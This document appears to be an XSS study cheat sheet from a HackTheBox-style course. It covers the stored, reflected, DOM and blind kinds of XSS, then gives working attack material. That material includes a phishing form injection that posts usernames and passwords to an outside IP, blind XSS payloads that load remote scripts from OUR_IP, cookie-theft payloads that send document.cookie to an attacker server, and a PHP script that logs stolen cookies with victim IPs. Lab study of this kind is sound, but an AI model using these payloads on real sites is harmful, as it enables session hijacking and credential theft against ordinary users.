# Cross-Site Scripting (XSS) Guide

## XSS Types Overview

```
Cross-Site Scripting (XSS)
├── Stored XSS (Persistent)
│   ├── Server-side stored
│   ├── Database stored
│   └── File system stored
├── Reflected XSS (Non-Persistent)
│   ├── URL-based reflection
│   ├── Form-based reflection
│   └── Header-based reflection
├── DOM-based XSS
│   ├── Client-side DOM manipulation
│   ├── JavaScript execution context
│   └── Browser-based processing
└── Blind XSS
    ├── Out-of-band execution
    ├── Delayed execution
    └── Admin panel execution
```

---

## XSS Types Detailed

### 1. Stored XSS (Persistent XSS)
**Description**: Malicious script is permanently stored on the target server (database, file system, etc.)

**Characteristics**:
- High impact and severity
- Affects all users who view the infected page
- Payload persists until manually removed
- Most dangerous type of XSS

**Common Locations**:
- Comment sections
- User profiles
- Message boards
- Guest books
- File uploads with preview

**Example Scenario**:
1. Attacker posts malicious script in a comment
2. Script gets stored in database
3. Every user visiting the page executes the script

### 2. Reflected XSS (Non-Persistent XSS)
**Description**: Malicious script is reflected off the web server immediately

**Characteristics**:
- Requires user interaction (clicking malicious link)
- Not stored on server
- Immediate execution
- Affects only the victim who clicks the link

**Common Locations**:
- Search forms
- Error messages
- URL parameters
- Form inputs

**Example Scenario**:
1. Attacker crafts malicious URL with script
2. Victim clicks the link
3. Server reflects the script back to browser
4. Browser executes the script

### 3. DOM-based XSS
**Description**: Vulnerability exists in client-side code rather than server-side

**Characteristics**:
- Executed entirely in browser
- Server never sees the malicious payload
- Manipulates DOM environment
- Harder to detect with traditional scanners

**Common Sources**:
- `document.URL`
- `document.location`
- `document.referrer`
- `window.location`

**Common Sinks**:
- `document.write()`
- `innerHTML`
- `eval()`
- `setTimeout()`

### 4. Blind XSS
**Description**: Payload executes in a different context where attacker cannot see immediate results

**Characteristics**:
- No immediate feedback
- Often executes in admin panels
- Requires out-of-band detection
- High impact when successful

**Common Locations**:
- Contact forms
- Support tickets
- Log viewers
- Admin dashboards

---

## XSS Discovery

**Entry point** = /phishing  
**Exploit page** = /send.php

### Basic Phishing Payload
```javascript
' onerror='document.getElementById("urlform").remove();' <div>
  <h3>Please login to continue</h3>
  <form action=http://10.10.17.184>
    <input type="text" name="username" placeholder="Username">
    <input type="text" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
</div> <!--
```

---

## XSS Payloads Reference

### Basic XSS Payloads
| Payload                                 | Description       |
| --------------------------------------- | ----------------- |
| `<script>alert(window.origin)</script>` | Basic XSS Payload |
| `<plaintext>`                           | Basic XSS Payload |
| `<script>print()</script>`              | Basic XSS Payload |

### HTML-Based XSS Payloads
| Payload                                     | Description            |
| ------------------------------------------- | ---------------------- |
| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS Payload |

### Page Modification Payloads
| Payload                                                                                       | Description                   |
| --------------------------------------------------------------------------------------------- | ----------------------------- |
| `<script>document.body.style.background = "#141d2b"</script>`                                 | Change Background Color       |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image       |
| `<script>document.title = 'HackTheBox Academy'</script>`                                      | Change Website Title          |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                | Overwrite website's main body |
| `<script>document.getElementById('urlform').remove();</script>`                               | Remove certain HTML element   |

### Advanced XSS Payloads
| Payload                                                                         | Description               |
| ------------------------------------------------------------------------------- | ------------------------- |
| `<script src="http://OUR_IP/script.js"></script>`                               | Load remote script        |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send Cookie details to us |

---

## BLIND XSS

**Definition**: Occurs when application does not react to the payload immediately, or displays on another screen, or at a page which attacker does not have access to.

### Challenge
- How to identify the vulnerable field
- How to know which XSS payload will work

### Solution
- Create a server (netcat or PHP) and make requests to it with each payload
- Use `<script>` tags or inline JavaScript execution
- Call custom JS files using payloads

### Blind XSS Payloads
```javascript
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

### How to Find Blind XSS
- Try different payloads in each field and monitor server requests
- Ignore fields with backend validation (email fields)
- Passwords can usually be ignored (stored as hashes)

---

## Session Hijacking

Once XSS entry point is identified, extract cookies using JavaScript execution:

### Cookie Extraction Payloads
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

### Remote Script Method
```javascript
<script src=http://OUR_IP/script.js></script>
```

---

## Cookie Harvesting PHP Script

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

---

## Essential Commands

| Command                                                             | Description                     |
| ------------------------------------------------------------------- | ------------------------------- |
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run xsstrike on a url parameter |
| `sudo nc -lvnp 80`                                                  | Start netcat listener           |
| `sudo php -S 0.0.0.0:80`                                            | Start PHP server                |




















